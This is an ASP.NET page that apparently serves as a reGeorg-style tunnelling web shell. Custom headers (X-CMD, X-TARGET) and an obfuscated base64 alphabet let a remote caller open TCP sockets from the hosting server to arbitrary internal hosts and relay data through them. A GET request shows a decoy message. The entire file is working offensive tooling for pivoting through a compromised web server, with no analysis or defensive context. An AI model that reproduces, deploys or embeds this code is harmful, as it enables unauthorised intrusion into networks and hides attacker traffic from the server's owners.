<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Collections" %>
<script runat="server">
	public String StrTr(string input, string frm, string to)
	{
		String r = "";
		for(int i=0; i< input.Length; i++)
		{
			int index = frm.IndexOf(input[i]);
			if(index != -1)
				r += to[index];
			else
				r += input[i];
		}
		return r;
	}
</script>
<%
	try
	{
		String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		String de = "BASE64 CHARSLIST";
		if (Request.HttpMethod == "POST")
		{
			String cmd = Request.Headers.Get("X-CMD");
			if (cmd == "CONNECT")
			{
				try
				{
					String target_str = System.Text.Encoding.Default.GetString(Convert.FromBase64String(StrTr(Request.Headers.Get("X-TARGET"), de, en)));
					String[] target_ary = target_str.Split('|');
					String target = target_ary[0];
					int port = int.Parse(target_ary[1]);
					IPAddress ip = IPAddress.Parse(target);
					System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
					Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					sender.Connect(remoteEP);
					sender.Blocking = false;
					Session.Add("socket", sender);
					Response.AddHeader("X-STATUS", "OK");
				}
				catch (Exception ex)
				{
					Response.AddHeader("X-ERROR", ex.Message);
					Response.AddHeader("X-STATUS", "FAIL");
				}
			}
			else if (cmd == "DISCONNECT")
			{
				try {
					Socket s = (Socket)Session["socket"];
					s.Close();
				} catch (Exception ex){

				}
				Session.Abandon();
				Response.AddHeader("X-STATUS", "OK");
			}
			else if (cmd == "FORWARD")
			{
				Socket s = (Socket)Session["socket"];
				try
				{
					int buffLen = Request.ContentLength;
					byte[] buff = new byte[buffLen];
					int c = 0;
					while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0)
					{
						string b64 = StrTr(System.Text.Encoding.Default.GetString(buff), de, en);
						s.Send(Convert.FromBase64String(b64));
					}
					Response.AddHeader("X-STATUS", "OK");
				}
				catch (Exception ex)
				{
					Response.AddHeader("X-ERROR", ex.Message);
					Response.AddHeader("X-STATUS", "FAIL");
				}
			}
			else if (cmd == "READ")
			{
				Socket s = (Socket)Session["socket"];
				try
				{
					int c = 0;
					byte[] readBuff = new byte[513];
					try
					{
						while ((c = s.Receive(readBuff)) > 0)
						{
							byte[] newBuff = new byte[c];
							System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
							string b64 = Convert.ToBase64String(newBuff);
							Response.BinaryWrite(Encoding.Default.GetBytes(StrTr(b64, en, de)));
						}
						Response.AddHeader("X-STATUS", "OK");
					}
					catch (SocketException soex)
					{
						Response.AddHeader("X-STATUS", "OK");
						return;
					}
				}
				catch (Exception ex)
				{
					Response.AddHeader("X-ERROR", ex.Message);
					Response.AddHeader("X-STATUS", "FAIL");
				}
			} 
		} else {
			Response.Write("Georg says, 'All seems fine'");
		}
	}
	catch (Exception exKak)
	{
		Response.AddHeader("X-ERROR", exKak.Message);
		Response.AddHeader("X-STATUS", "FAIL");
	}
%>
